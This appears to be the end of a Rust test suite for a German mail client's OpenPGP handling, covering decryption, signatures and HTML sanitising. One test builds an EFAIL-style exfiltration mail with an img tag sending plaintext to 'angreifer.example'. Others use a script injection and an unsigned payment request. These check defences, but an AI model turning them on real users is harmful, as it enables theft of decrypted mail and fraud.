    fn fremder_empfaenger_und_kaputte_nachricht() {
        let s = schluessel();
        let mail = pgp_mime(
            "bea@example.org",
            &verschluesseln(INNEN.as_bytes(), &s.carl, None),
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some(PASSPHRASE), &[]));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::NichtEntschluesselt
        );
        assert!(ergebnis
            .status
            .meldung
            .unwrap()
            .contains("keinen passenden privaten Schlüssel"));

        // Ein Zeichen im Chiffrat verändert
        let armored = verschluesseln(INNEN.as_bytes(), &s.anna, None);
        let zeilen: Vec<&str> = armored.lines().collect();
        let mitte = zeilen.len() / 2;
        let mut kaputt: Vec<String> = zeilen.iter().map(|z| z.to_string()).collect();
        let zeile = &mut kaputt[mitte];
        let erstes = if zeile.starts_with('A') { "B" } else { "A" };
        zeile.replace_range(0..1, erstes);
        let mail = pgp_mime("bea@example.org", &kaputt.join("\n"));
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some(PASSPHRASE), &[]));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::NichtEntschluesselt
        );
        assert!(ergebnis.roh.is_none());
    }

    #[test]
    fn signaturen_unbekannt_fremd_und_manipuliert() {
        let s = schluessel();
        // Unbekannter Schlüssel
        let mail = pgp_mime(
            "bea@example.org",
            &verschluesseln(INNEN.as_bytes(), &s.anna, Some(&s.bea)),
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some(PASSPHRASE), &[]));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::Entschluesselt
        );
        assert_eq!(ergebnis.status.signatur, Signatur::Unbekannt);
        assert!(ergebnis.status.signierer_schluessel.is_some());

        // Von Carl signiert, aber als Bea ausgegeben
        let mail = pgp_mime(
            "bea@example.org",
            &verschluesseln(INNEN.as_bytes(), &s.anna, Some(&s.carl)),
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some(PASSPHRASE), &[&s.carl, &s.bea]));
        assert_eq!(ergebnis.status.signatur, Signatur::AndereAdresse);
        assert_eq!(
            ergebnis.status.signierer.as_deref(),
            Some("Carl <carl@example.org>")
        );

        // PGP/MIME signiert, gültig
        let teil = "Content-Type: text/plain; charset=utf-8\r\n\r\nSigniert.\r\n";
        let sig = signatur(&s.bea, teil.trim_end_matches("\r\n").as_bytes());
        let mail = signiert_mime("bea@example.org", teil.trim_end_matches("\r\n"), &sig);
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(None, &[&s.bea]));
        assert_eq!(ergebnis.status.verschluesselung, Verschluesselung::Keine);
        assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
        let anzeige = crate::anzeige::aufbereiten(&ergebnis.roh.unwrap(), None).unwrap();
        assert!(anzeige.text.contains("Signiert."));
        assert!(
            anzeige.anhaenge.is_empty(),
            "Signaturteil nicht als Anhang zeigen"
        );

        // Inhalt nachträglich verändert
        let mail = signiert_mime(
            "bea@example.org",
            &teil
                .trim_end_matches("\r\n")
                .replace("Signiert.", "Gefaelscht."),
            &sig,
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(None, &[&s.bea]));
        assert_eq!(ergebnis.status.signatur, Signatur::Ungueltig);

        // Mit LF statt CRLF übertragen: bleibt gültig (kanonische Form)
        let mail = signiert_mime("bea@example.org", teil.trim_end_matches("\r\n"), &sig)
            .replace("\r\n", "\n");
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(None, &[&s.bea]));
        assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    }

    #[test]
    fn mischmail_ist_nur_teilweise_signiert() {
        let s = schluessel();
        let teil = "Content-Type: text/plain; charset=utf-8\r\n\r\nSignierter Teil.";
        let sig = signatur(&s.bea, teil.as_bytes());
        let mail = format!(
            "{}Content-Type: multipart/mixed; boundary=\"mix\"\r\n\r\n--mix\r\n\
Content-Type: multipart/signed; micalg=pgp-sha256; protocol=\"application/pgp-signature\"; boundary=\"sig\"\r\n\r\n\
--sig\r\n{teil}\r\n--sig\r\nContent-Type: application/pgp-signature\r\n\r\n{sig}\r\n--sig--\r\n\
--mix\r\nContent-Type: text/plain\r\n\r\nUnsignierter Zusatz: Bitte Geld an IBAN XY.\r\n--mix--\r\n",
            kopf("bea@example.org")
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(None, &[&s.bea]));
        assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
        assert!(ergebnis.status.signatur_teilweise);
        // Angezeigt wird die Mail wie sie ist.
        assert!(ergebnis.roh.is_none());
    }

    #[test]
    fn teilweise_verschluesselt_wird_nicht_entschluesselt() {
        let s = schluessel();
        let armored = verschluesseln(INNEN.as_bytes(), &s.anna, None);
        // EFAIL-artig: fremdes HTML um einen verschlüsselten Teil
        let mail = format!(
            "{}Content-Type: multipart/mixed; boundary=\"mix\"\r\n\r\n--mix\r\n\
Content-Type: text/html\r\n\r\n<img src=\"https://angreifer.example/?\r\n--mix\r\n\
Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"enc\"\r\n\r\n\
--enc\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n--enc\r\nContent-Type: application/octet-stream\r\n\r\n{armored}\r\n--enc--\r\n\
--mix\r\nContent-Type: text/html\r\n\r\n\">\r\n--mix--\r\n",
            kopf("bea@example.org")
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some(PASSPHRASE), &[]));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::Teilweise
        );
        assert!(ergebnis.roh.is_none());

        // Inline-Block mit zusätzlichem Text ebenso
        let mail = format!(
            "{}Content-Type: text/plain\r\n\r\nVorspann\r\n{armored}\r\n",
            kopf("bea@example.org")
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some(PASSPHRASE), &[]));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::Teilweise
        );
        assert!(ergebnis.roh.is_none());
    }

    #[test]
    fn inline_verschluesselt_und_klartextsignatur() {
        let s = schluessel();
        let armored = verschluesseln("Hallo Anna, inline.".as_bytes(), &s.anna, Some(&s.bea));
        let mail = format!(
            "{}Content-Type: text/plain\r\n\r\n{armored}\r\n",
            kopf("bea@example.org")
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some(PASSPHRASE), &[&s.bea]));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::Entschluesselt
        );
        assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
        let anzeige = crate::anzeige::aufbereiten(&ergebnis.roh.unwrap(), None).unwrap();
        assert!(anzeige.text.contains("Hallo Anna, inline."));

        let klartext = pgp::composed::CleartextSignedMessage::sign(
            OsRng,
            "Hallo Anna,\nsigniert.\n",
            &s.bea.primary_key,
            &Password::from(PASSPHRASE),
        )
        .unwrap()
        .to_armored_string(ArmorOptions::default())
        .unwrap();
        let mail = format!(
            "{}Content-Type: text/plain\r\n\r\n{klartext}",
            kopf("bea@example.org")
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(None, &[&s.bea]));
        assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
        assert!(!ergebnis.status.signatur_teilweise);
        let mail = format!(
            "{}Content-Type: text/plain\r\n\r\nVorher\r\n{klartext}",
            kopf("bea@example.org")
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(None, &[&s.bea]));
        assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
        assert!(ergebnis.status.signatur_teilweise);
    }

    #[test]
    fn entschluesseltes_html_wird_bereinigt() {
        let s = schluessel();
        let innen = "Content-Type: text/html; charset=utf-8\r\n\r\n<p>Hallo</p><script>alert(1)</script><img src=\"https://tracker.example/p.gif\">\r\n";
        let mail = pgp_mime(
            "bea@example.org",
            &verschluesseln(innen.as_bytes(), &s.anna, None),
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some(PASSPHRASE), &[]));
        let anzeige = crate::anzeige::aufbereiten(&ergebnis.roh.unwrap(), None).unwrap();
        let html = anzeige.html.unwrap();
        assert!(html.contains("Hallo") && !html.contains("script") && !html.contains("tracker"));
        assert_eq!(anzeige.extern_blockiert, 1);
    }

    #[test]
    fn vorpruefung_erkennt_openpgp() {
        assert!(!moeglich(crate::anzeige::tests::MULTIPART.as_bytes()));
        assert!(moeglich(b"Content-Type: Multipart/Encrypted; protocol=x"));
        assert!(moeglich(b"Content-Type: multipart/signed; protocol=x"));
        assert!(moeglich(b"\r\n-----BEGIN PGP MESSAGE-----\r\n"));
        assert!(moeglich(b"\r\n-----begin pgp signed message-----\r\n"));
    }

    #[test]
    fn normale_mail_bleibt_unveraendert() {
        let ergebnis = verarbeiten(
            crate::anzeige::tests::MULTIPART.as_bytes(),
            &Schluesselring::default(),
        );
        assert_eq!(ergebnis.status, PgpStatus::default());
        assert!(ergebnis.roh.is_none());
    }
}
